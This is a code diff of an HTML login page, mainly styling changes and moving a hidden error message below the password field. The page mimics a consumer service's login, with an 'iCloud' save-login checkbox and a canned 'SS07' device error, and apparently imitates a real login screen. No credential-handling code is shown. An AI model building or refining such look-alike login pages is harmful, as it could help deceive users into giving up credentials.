@@ -44,15 +44,18 @@
       transition: bottom 0.30s ease;
       min-width: 75%;
     }
+
     /* Input containers slightly wider */
     .input-container {
       max-width: 95%;
       margin: 0 auto;
     }
+
     /* Ensure inputs fill the container */
     input[type="text"], input[type="password"] {
       width: 100%;
     }
+
     /* Move Password label and input line */
     label[for="password"] {
       position: relative;
@@ -62,23 +65,27 @@
       position: relative;
       top: -2.7px;
     }
+
     /* Move checkbox and text up */
     label.inline-flex.items-center {
       position: relative;
       top: -2px;
     }
+
     /* Move forgot password text up */
     #forgotPassword {
       position: relative;
       top: -3.5px;
     }
+
     /* Error message styling */
-    #loginForm #errorMsg {
-      margin-top: -4px; 
+    #errorMsg {
       font-size: 0.875rem;
       line-height: 1.25rem;
+      color: #f56565;
       word-wrap: break-word;
     }
+
     /* Adjust the Log In heading */
     h1 {
       position: relative;
@@ -95,16 +102,15 @@
     </button>
     <h1 class="mt-12 mb-8 text-center text-black text-2xl font-medium font-sans">Log In</h1>
     <form id="loginForm" class="flex flex-col space-y-6">
+      <!-- Username field -->
       <div class="flex flex-col input-container">
         <label for="username" class="text-xs font-medium text-gray-400 tracking-widest mb-1 font-sans">
           USERNAME, EMAIL, OR PHONE
         </label>
         <input id="username" type="text" class="border-b border-gray-300 focus:outline-none focus:border-gray-400 text-lg font-sans pr-10 w-full" autocomplete="username" required />
-        <p id="errorMsg" class="text-sm text-red-500 font-normal leading-tight hidden break-words">
-          SS07: Device associated with high number of accounts. Learn more 
-          <a href="#" class="text-blue-600 underline">here</a>.
-        </p>
       </div>
+
+      <!-- Password field -->
       <div class="flex flex-col relative input-container">
         <label for="password" class="text-xs font-medium text-gray-400 tracking-widest mb-1 font-sans">PASSWORD</label>
         <input id="password" type="password" class="border-b border-gray-300 focus:outline-none focus:border-gray-400 text-lg font-sans pr-10 w-full" autocomplete="current-password" required />
@@ -112,14 +118,27 @@
           <i id="eyeIcon" class="fas fa-eye-slash"></i>
         </button>
       </div>
+
+      <!-- Error message under password -->
+      <div class="input-container">
+        <p id="errorMsg" class="hidden">
+          SS07: Device associated with high number of accounts. Learn more 
+          <a href="#" class="text-blue-600 underline">here</a>.
+        </p>
+      </div>
+
+      <!-- Checkbox -->
       <label class="inline-flex items-center space-x-2 font-sans text-sm text-black input-container">
         <input type="checkbox" checked />
         <span>Save Login Info on your iCloud devices</span>
       </label>
+
+      <!-- Forgot password -->
       <a id="forgotPassword" href="#" class="text-[#0083ff] text-center text-sm font-sans mt-2 input-container">Forgot your password?</a>
     </form>
   </div>
 
+  <!-- Login button -->
   <button id="loginBtn" type="button" class="bg-gray-400 text-white font-medium text-lg py-3 rounded-full fixed left-1/2 transform -translate-x-1/2 bottom-4" disabled>Log In</button>
 
   <script>
